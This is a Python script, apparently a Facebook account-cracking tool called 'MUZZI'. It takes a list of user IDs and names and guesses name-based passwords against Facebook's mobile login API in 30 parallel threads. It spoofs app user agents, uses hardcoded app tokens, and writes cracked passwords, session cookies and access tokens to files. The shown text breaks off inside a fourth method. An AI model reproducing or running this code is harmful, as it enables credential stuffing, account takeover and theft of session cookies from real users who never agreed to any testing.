import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
import datetime,subprocess
import zipfile
from uuid import uuid4
from time import sleep as sp

#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
hashes = []


try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
	#os.system("python dilute")

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)

from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'

def line():
	print(51*'-')

def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/BTjSpLJPWxV5B5hqNcW2J0')
	

#___________ [ Lists Used in Script]________

id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()
def logo():
	os.system('clear')
	logo = (f'''\033[1;37m                                 
\033[1;32m.88b  d88. db    db d88888D d88888D d888888b 
\033[1;32m88'YbdP`88 88    88 YP  d8' YP  d8'   `88'   
\033[1;32m88  88  88 88    88    d8'     d8'     88    
\033[1;32m88  88  88 88    88   d8'     d8'      88    
\033[1;32m88  88  88 88b  d88  d8' db  d8' db   .88.   
\033[1;32mYP  YP  YP ~Y8888P' d88888P d88888P Y888888P
---------------------------------------------------
\033[1;32mJani Kadi Vich Pawai
---------------------------------------------------
 [•] \033[1;32mOwner     :  \033[1;32m Muzzi
 [•] Github    :   HAVEELI PE AJANA
 [•] Status    :   FREE
 [•] Tool      :   FREE 
 [•] Facebook  :  \033[1;32m MUZZI
 [•] Version   :  \033[1;32m 0.1\033[1;32m \033[1;37m
---------------------------------------------------''')
	p(logo)
def clear():
	os.system("clear")
	
	
pass
 
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""

aqib_token = f'{id}{xp}'

def connection_token():
	digits_count = 16
	letters_count = 16
	letters = ''.join((random.choice(string.ascii_letters) for i in range(letters_count)))
	digits = ''.join((random.choice(string.digits) for i in range(digits_count)))

	# Convert resultant string to list and shuffle it to mix letters and digits
	sample_list = list(letters + digits)
	random.shuffle(sample_list)
	# convert list to string
	final_string = ''.join(sample_list)
	return final_string


def iAmMethod1Ua():
	abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
	pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
	build = random.choice(abc)+random.choice(abc)+random.choice(abc)
	FBBV = str(random.randint(111111111,999999999))
	FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone","Telenor"])
	ua = random.choice(["Mozilla/5.0 (Linux; Android 11; Samsung Galaxy S21 Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Samsung; FBBD/Samsung; FBDV/Galaxy S21; FBSV/11; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 12; Google Pixel 5 Build/SP3D.210925.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Google; FBBD/Pixel 5; FBDV/Pixel 5; FBSV/12; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 11; OnePlus 9 Pro Build/SP2A.210617.036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/OnePlus; FBBD/OnePlus; FBDV/9 Pro; FBSV/11; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 11; Xiaomi Mi 11 Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Xiaomi; FBBD/Xiaomi; FBDV/Mi 11; FBSV/11; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 11; OPPO Find X3 Pro Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/OPPO; FBBD/OPPO; FBDV/Find X3 Pro; FBSV/11; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 11; Realme GT Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/GT; FBSV/11; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 10; Huawei P40 Pro Build/HUAWEIP40) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Huawei; FBBD/Huawei; FBDV/P40 Pro; FBSV/10; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 10; LG G8 ThinQ Build/QP1A.191005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/LG; FBBD/LG; FBDV/G8 ThinQ; FBSV/10; FBCA/armeabi-v7a:;]","Mozilla/5.0 (Linux; Android 10; Motorola Moto G Power Build/RPS31.Q1-21-20) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Motorola; FBBD/Motorola; FBDV/Moto G Power; FBSV/10; FBCA/armeabi-v7a:;]",])
	return ua



def iAmMethod2Ua():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong','Ufone'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua =random.choice(["",])
	return ua

def iAmMethod3Ua():
	ua = 'Mozilla/5.0 (Linux; Android 11; Realme GT Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/GT; FBSV/11; FBCA/armeabi-v7a:;]','Mozilla/5.0 (Linux; Android 10; Realme Narzo 30 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/Narzo 30; FBSV/10; FBCA/armeabi-v7a:;]','Mozilla/5.0 (Linux; Android 11; Realme 8 Pro Build/RKQ1.200903.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/8 Pro; FBSV/11; FBCA/armeabi-v7a:;]','Mozilla/5.0 (Linux; Android 10; Realme X7 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/X7 Pro; FBSV/10; FBCA/armeabi-v7a:;]','Mozilla/5.0 (Linux; Android 10; Realme C11 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.124 Mobile Safari/537.36 [FBAN/FB4A; FBAV/345.0.0.39.93; FBPN/com.facebook.katana; FBLC/en_US; FBBV/283046384; FBCR/; FBMF/Realme; FBBD/Realme; FBDV/C11; FBSV/10; FBCA/armeabi-v7a:;]'
	return ua
nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class MUZZI:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def MUZZI(self):
		#heck_again()
		logo()

		p(" [1] \033[1;37mFILE CRACK ")
		p(" [E] \033[1;37mEXIT ")
		line()
		opt1 = input(" [•] Select An Option : ")
		if opt1 == "1":self.file_menu()
		elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
		else:p(" [•] Wrong Select ");sp(2);self.MUZZI()
	
	
	def file_menu(self):
		#check_again()
		logo()
		p(" [•] \033[1;37mExample /sdcard/File.txt")
		file = input(" [•] \033[1;37mPut File Path : ")
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p(" [•] File Path Incorrect ")
			sp(2);self.file_menu()
	def method_select(self,id):
		#check_again()
		logo()
		p(" [1] \033[1;37mMethod 1]")
		p (" [2] \033[1;37mMethod 2]")
		p (" [3] \033[1;37mMethod 3]")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		if m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		if m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		#elif m_opt =="4":
			method.append('iiii')
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(3);self.method_select(id)

	def password_menu(self,id):
		#check_again()
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 10 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should under 15 ");sp(3);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Your Passwords like : first last firstlast first123 first1234 first12345 etc ")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()		
		p(" [•] Total Accounts : %s "%(str(len(id))))
		p(" [•] Use Flight Mode After Every 3 Minutes") 
		p(" [•] Cracking Has Been Started ")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()		
		p(" [•] Cloning Has been Completed ")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.MUZZI()
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [MUZZI] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])		
			MUZZI_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBDV/SM-G975U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'openid_emails': "['01710940017']",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':MUZZI_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45201',
'X-FB-SIM-HNI': '45204',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-Connection-Quality':'EXCELLENT',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'unknown',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
					p('\r\033[1;92m[MUZZI-OK] %s | %s \033[1;97m '%(uid,pw))		
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
					open('/sdcard/MUZZI_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/MUZZI_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[MUZZI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/MUZZI_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [MUZZI] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,441)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			MUZZI_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBDV/8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				headers={'Host': 'b-graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Quality': 'EXCELLENT',
'X-Fb-Sim-Hni': '41001',
'X-Fb-Net-Hni': '41001',
'User-Agent':MUZZI_ua,
'X-Fb-Connection-Bandwidth': '24714729',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Connection-Type': 'WIFI',
'X-Fb-Device-Group': '4503',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'Priority': 'u=3, i',
'Accept-Encoding': 'gzip, deflate',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
}

				data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : uid,
'password' : pw,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_US',
'client_country_code' : 'US',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers,verify=True).json()
				#rint(q)
				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[MUZZI OK] %s | %s \033[1;97m '%(uid,pw))
					#(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[💥]COOOKIIE :\033[1;33m "+cok)
					open('/sdcard/MUZZI_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/MUZZI_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[MUZZI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/MUZZI_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [MUZZI] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			MUZZI_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBDV/A54;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			#UPDATED
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "login",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "en_US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':MUZZI_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[MUZZI-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/MUZZI_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					#os.system('espeak -a 300 " MUZZI,  Ok,  id"')
					open('/sdcard/MUZZI_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;35m[MUZZI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/MUZZI_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
